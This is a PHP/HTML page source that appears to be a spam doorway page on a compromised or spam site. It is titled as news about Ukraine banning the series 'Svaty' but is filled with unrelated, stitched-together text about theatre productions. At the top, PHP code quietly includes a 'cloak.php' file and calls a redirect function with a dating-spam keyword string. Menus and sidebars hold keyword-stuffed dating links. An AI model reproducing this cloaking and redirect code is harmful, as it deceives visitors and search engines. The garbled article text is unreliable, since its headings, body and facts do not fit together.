<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%be%d1%81%d0%be%d0%b1%d0%b8%d1%81%d1%82%d0%b0+%d1%81%d0%bb%d1%83%d0%b6%d0%b1%d0%b0+%d1%81%d0%b2%d0%b0%d1%82%d1%96%d0%b2+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%9c%d0%b0%d0%ba%d1%96%d1%97%d0%b2%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>В Украине запретили сериал "Сваты"</title>
	<meta name="description" content="Усі новини Прикордонна служба. Двом російським акторам зі "Сватів" заборонили в'їзд до України до Луганська, у пакунку серед особистих речей виявили 50 бланків страхових полісів. Державна прикордонна служба..." />
	<link rel="canonical" href="https://masage.od.ua/img/106/giwa-osobista-sluzhba-svatv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/428/ryc-znayomstva-kompan-v.php">знайомства компанії в Верхньодніпровськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/cadi-znayomstva-dlya-doroslih.php">знайомства для дорослих одинаків Луцьк Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/457/simoq-krash-sayti.php">кращі сайти знайомств в Інтернеті Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/335/qijyd-veb-sayt-azatskih.php">веб-сайт азіатських знайомств Камянка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/211/toki-znayomstva-dvchat-nomer.php">знайомства дівчат номер Новомиргород Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Особиста служба сватів поблизу Макіївка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Режисер — Лідія Кушкова нар. України Художник — Станіслав Петровський Музичне оформлення засл. України Юрія Кутєпова та Костянтина Сосідки. Напередодні Нового року часто відбуваються дива, здійснюються мрії, оживають іграшки, усе, як уві сні… Дитяча вистава «Лускунчик» за відомою казкою німецького письменника Ернста Теодора Амадея Гофмана «Лускунчик і мишачий король», написана на початку XIX століття, — незаперечний доказ цього.</p>
<p>Серед новорічних подарунків діти знаходять Лускунчика, потворну ляльку для колення горіхів, з якої глузує Фріц. Проте, Марі, його сестричці, Лускунчик припав до душі. Вона захищає його, опікується ним, ніби інстинктивно відчуваючи, що він — зовсім не іграшка…. Сценографія київського художника Станіслава Петровського переносять глядача у різнобарвні казкові царства. У виставі звучать пісні на музику композитора Юрія Кутєпова. Музичне оформлення здійснив звукорежисер Костянтин Сосідка. Наша музична вистава про веселі пригоди чудернацької дівчинки Пеппі з дивним прізвищем Довгапанчоха та її друзів — Томмі та Аніки.</p><a id='b1'></a><h3>Доступність посилання</h3><p>У виставі звучать пісні на музику Юрія Бєдніка, танці у поставці Володимира Кравченка. Казка розрахована на дітей від років. Українська музична казка за народними мотивами.</p>
		
	<p>У нашій версії Пан Коцький постає дрослим, мудрим і талановитим котиком! Він є прикладом для дітей: учить, як треба поважати старших, як вміти прощати, а також, як виживати у страшному темному лісі. Музична казка за народними мотивами Режисер: народна артистка України Лідія Кушкова Композитор: засл.</p>
<p>Сучасна, повчальна, музична казка за народними мотивами, з піснями, танцями, гумором, яка переконає, що часто-густо у житті перемагає зовсім не той, хто фізично сильніший. Жили були дід і баба. Одного дня завітали до них гості, які порадили, щоб якось пережити кризу, запропонували купити у них козу. І тут почалось… Коза, у вигляді сучасної дівчини, яка і співає, і танцює спочатку викликає симпатію, поте через свої вчинки поступово втрачає авторитет.</p>
<p>Господарів, які прийняли її, як рідну, пригостили, згодом виганяє з хати. Тих, хто її щодня випасає, оббріхує перед дідом, що начебто нічого «не пила і не їла». Зустрінетеся у казці з вовком, зайчихою, іншими персонажами, які примусять замислитись і дітей, і дорослих над тим, кого ж другом вважати, а кого і … на поріг не пускати…. У році казку переглянули польські та чеські глядачі, а року — за океаном, у Канаді. В ролях: народні артисти України Л. Кушкова, В. Гунькін, заслужені арт.</p><strong><a id='b2'></a><h2>Суд визнав протиправною заборону «Сватів»</h2></strong><p>Ніколаєва, В. Сушко Коза , артисти О. Завгородня, В. Носко, В. Олійник, С. Гордельянов, Д. Прищепо, Я. Корольова, Н. Гаврикова, Л. Кусакіна, О. Радочинська та ін. Віктор Гунькін Дід н. Кушкова баба , з. Сушко Коза , з. Мойсеєнко дід. У виконанні естрадно-симфонічного оркестру під керівництвом засл. України Юрія Бєдніка. Концерт є лауреатом фестивалю патріотичного театру «Миротворці», «Арт-Юкрейн», переможець театрального фестивалю «Січеславна» у номінації «За громадянську позицію».</p><strong><a id='b3'></a><h2>«Свати» ще не заборонили, але можуть: чому і за що</h2></strong><p>Коллектив театру гастролював із концертом у Канаді року, а також по Україні, неодноразово в зоні АТО. Видатний український письменник-гуморист Остап Вишня у х роках минулого століття разом із групою авторів: поетом Майком Йогансеном, прозаїком Миколою Хвильовим і молодими режисерами і композиторами  створили музичну комедію-рімейк за мотивами англійської опери композитора Артура Саллівана та лібретиста Уільяма Гіл-берта «Мікадо». В результаті вийшов бурлеск іт.</p>
<p>Сценічну версію нашої вистави зробив режисер Микола Яремків, а сучасну музику написав харківський композитор Геннадій Фролов. Усі події із середовища родини та оточення Мікадо — імператора Японії — дотепно й кумедно переведені  на колізії та інтриги, які схожі на ті, що сьогодні мають місце в політиці сучасної України.</p><img src="https://0.academia-photos.com/attachment_thumbnails/62459118/mini_magick20200325-8939-187r5gm.png?1585123311" alt="Перший державний драматичний театр, заснований 1918 року в Києві" style="max-width: 480px; max-height: 480px;"/><p>Сюжет простий та інтригуючий. Японська армія завоювала сусідню Манчжурію. Імператор Мікадо прагне зробити правителем держави сина, принца Нанкіпу. Проте він не хоче, бо закохався без тями в гейшу Юм-Юм і всіляко уникає цього призначення. Щоб примусити сина стати імператором Манчжурії, Мікадо піднімає на ноги всіх міністрів, помічників і урядовців Японії…. Юрій Бєднік Балетмейстер — з. Олексій Коваленко Асистент режисера — Тетяна Лоза. Дія відбувається на початку XІX століття в українському селі Анатівка, де «з давніх пір живуть українці, росіяни і євреї.</p><a id='b4'></a><h3>НА ЦЮ Ж ТЕМУ</h3><p>Живуть разом,  працюють разом, лише помирати кожен іде на своє кладовище. Такий звичай». Також за звичаєм євреї мали одружуватися з євреями, а батьки самі обирали дітям вигідних женихів, як і в багатьох народів світу тих часів. У виставі піднімаються вічні теми  кохання, пошуку щастя, пошуку Бога і свого місця в житті. Національний гумор і оптимізм по-філософськи  протистоять різним неприємностям у житті персонажів. У мюзиклі звучить чарівна музика знаменитого американського композитора Джеррі Бока, органічно  переплітаючись із народною — єврейською і циганською. Тривалість вистави — 2 год.</p>
<p>ҐОЛДА, його дружина — засл. України Оксана Петровська , засл. України Ірина Медяник. України Михайло Чернявський. України Віктор Гунькін. РЕБЕ — нар. Дніпровський академічний український музично-драматичний театр ім. Горіна «Поминальна молитва» — Віктор Шевченко. Важко зустріти театрала, та й не тільки театрала, який не чув би про відомий американський мюзикл знаменитого композитора Джеррі Бока «Fiddler on the Roof» «Скрипаль на даху» за мотивами творів класика єврейської літератури Шолом-Алейхема , а також про однойменний художній фільм, який отримав три Оскара, в тому числі за кращу музику.</p>
		
			
				<div>Сваты 6 (6-й сезон, 6-я серия)</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/ViP8jJTwak4' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>У році режисер і композитор народний артист Росії Володимир Назаров ознаменував відкриття свого Державного музичного театру національного мистецтва саме цією постановкою, але абсолютно в іншій інтерпретації. Від мюзиклу «Fiddler on the Roof» Скрипаль на даху залишилася тільки назва та кілька музичних номерів.</p><strong><a id='b5'></a><h2>"1 + 1" судится из-за запрета сериала "Сваты"</h2></strong><p>Володимир Назаров наповнив мюзикл новими сценами з Шолома-Алейхема, радикально змінив фінал і доповнив музичне оформлення безліччю старовинних єврейських мелодій, знайдених в архівах Московської синагоги. Мюзикл був номінований на премію «Золота маска» в чотирьох номінаціях! Він мав великий успіх на багатьох сценах Європи, в тому числі в Україні. На сцені Дніпропетровського академічного театру опери та балету побачили «Скрипаля на даху» майбутні меценати Дніпра і загорілися ідеєю мати його в репертуарі одного з рідних театрів. Назаров, почесний громадянин Новомосковська, переїхав на постійне місце проживання на свою батьківщину, в Україну, де відновив активну діяльність по розвитку музично-театральної культури.</p>
<p>Написав і поставив в Дитячому оперному театрі  Києва оперу «Жив собi пес», а в кінці року був запрошений в Дніпро з проханням поставити свого «Скрипаля» на сцені Дніпровського академічного українського музично-драматичного театру ім.</p>
		
	<p>Шевченка, яким керує справжній патріот України, віддана своїй батьківщині та мистецтву заслужена артистка України Оксана Іванівна Петровська. Мюзикл «Скрипаль на даху» відкриває й ювілейний сезон театру! Меценати міста допомогли оснастити театр новою унікальною звуковою та освітлювальною апаратурою, посприяли виготовленню декорацій, костюмів та реквізиту.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/454/xejof-znayomstva-z-zhnkoyu.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/327/xar-shvidksne-znayomstvo.php">швидкісне знайомство центральне поруч Хмельницький Україна</a></li><li><a href="https://masage.od.ua/img/237/lij-pdklyuchennya-dati.php">підключення дати Ровеньки Україна</a></li><li><a href="https://masage.od.ua/img/327/dyjeb-naykrash-mstsya.php">найкращі місця підключення Южне Україна</a></li><li><a href="https://masage.od.ua/img/133/loru-zona-znayomstv-v.php">зона знайомств в Ізмаїл Україна</a></li><li><a href="https://masage.od.ua/img/237/vyvu-lesbyanki-onlayn.php">лесбіянки онлайн знайомства Бобринець Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#b1'>Доступність посилання</a></li>
<li><a href='#b2'>Суд визнав протиправною заборону «Сватів»</a></li>
<li><a href='#b3'>«Свати» ще не заборонили, але можуть: чому і за що</a></li>
<li><a href='#b4'>НА ЦЮ Ж ТЕМУ</a></li>
<li><a href='#b5'>"1 + 1" судится из-за запрета сериала "Сваты"</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/418/wipuk-sayti-znayomstv-dlya.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>